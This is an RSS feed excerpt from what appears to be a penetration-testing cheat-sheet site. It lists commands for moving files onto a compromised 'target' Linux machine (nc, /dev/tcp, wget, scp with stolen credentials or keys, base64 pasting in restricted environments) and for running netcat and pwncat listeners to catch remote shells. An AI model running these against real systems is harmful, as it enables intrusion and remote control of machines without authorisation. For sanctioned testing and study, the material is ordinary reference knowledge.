channel.title: Nc on TLDRBins
channel.description: Recent content in Nc on TLDRBins

item.title: File Transfer (Linux To Linux)
item.description: HTTP nc scp PIPE Base64 # Start a local HTTP server python3 -m http.server <LOCAL_PORT> # In target Linux machine wget <LOCAL_IP>:<LOCAL_PORT>/<FILE> # In target Linux machine curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o <REMOTE_DEST_PATH> # In our local Linux machine nc -lvnp <LOCAL_PORT> < <FILE> # In target Linux machine nc -w3 <LOCAL_IP> <LOCAL_PORT> > <FILE> Remote to Local # If you have target password scp <USER>@<TARGET>:<REMOTE_FILE_PATH> <LOCAL_DEST_PATH> # If you have a ssh key scp -i id_rsa <USER>@<TARGET>:<REMOTE_FILE_PATH> <LOCAL_DEST_PATH> Local to Remote # If you have target password scp <LOCAL_FILE_PATH> <USER>@<TARGET>:<REMOTE_DEST_PATH> # If you have a ssh key scp -i id_rsa <LOCAL_FILE_PATH> <USER>@<TARGET>:<REMOTE_DEST_PATH> Local to Remote # In our local Linux machine cat <FILE> | nc -lnvp <LOCAL_PORT> # In target Linux machine exec 3<>/dev/tcp/<LOCAL_IP>/<LOCAL_PORT> # Ctrl+C to interrupt after some time cat <&3 > <FILE> # Check md5sum <FILE> Small binary # Base64 encode binary cat <FILE> | base64 -w0 # Copy and paste the base64 encoded binary echo -n '<BASE64_FILE>' | base64 -d > <FILE> Note: For restricted environment

item.title: Listeners
item.description: Listener Tools nc ncat pwncat rlwrap nc -lvnp <LOCAL_PORT> # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp <LOCAL_PORT> pwncat-cs -lp <LOCAL_PORT> # After getting a connection (local) pwncat$ back Ref: pwncat
